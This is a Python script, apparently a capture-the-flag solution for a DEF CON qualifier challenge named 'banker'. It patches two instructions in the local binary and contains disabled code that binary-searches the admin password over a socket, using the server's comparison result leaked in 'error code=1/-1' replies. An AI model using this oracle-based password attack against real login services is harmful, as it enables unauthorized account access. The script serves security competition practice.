#!/usr/bin/env python

from chdrft.main import app
from chdrft.tube.connection import Connection
import string
import itertools
from chdrft.utils.misc import PatternMatcher
import re
from chdrft.emu.binary import x86_mc, patch_file

global flags, cache
flags = None
cache = None
host='banker_15d6ba5840307520a36aabed33e00841.quals.shallweplayaga.me'
port=9252

alnum_list=[]
for i in range(128):
  if bytes([i]).isalnum():
    alnum_list.append(bytes([i]))
alnum_list.sort()

def args(parser):
  pass
def patch():
  patch_file('./banker', 0x08049DDE, x86_mc.get_disassembly('mov dword [esp], 0xffff'))
  patch_file('./banker', 0x08049DEA, x86_mc.get_disassembly('mov dword [esp], 0xffff'))
  return

def main():
  if 1:
    patch()
    return
  print(host, port)
  with Connection(host, port) as s:
    cnds=[]
    n=8
    nx=len(alnum_list)
    T=0
    H=(len(alnum_list)**n)-1
    while T<=H:
      M=(T+H)//2
      s.send('admin\n')
      buf=b''
      v=M
      for i in range(n):
        buf+=alnum_list[v%nx]
        v//=nx
      buf=buf[::-1]

      s.send(buf+b'\n')
      print('on iter ', T, H, buf)
      res=s.recv_until(PatternMatcher.fromre(b'error code=(1|-1)|Successfully'))
      if res.find(b'Successfully')!=-1:
        print('found for ', buf)
        T=M
        break
      else:
        print(res)
        m=re.search(b'error code=(1|-1)', res)

        assert m
        if int(m.group(1))==1:
          T=M+1
        else:
          H=M-1








app()
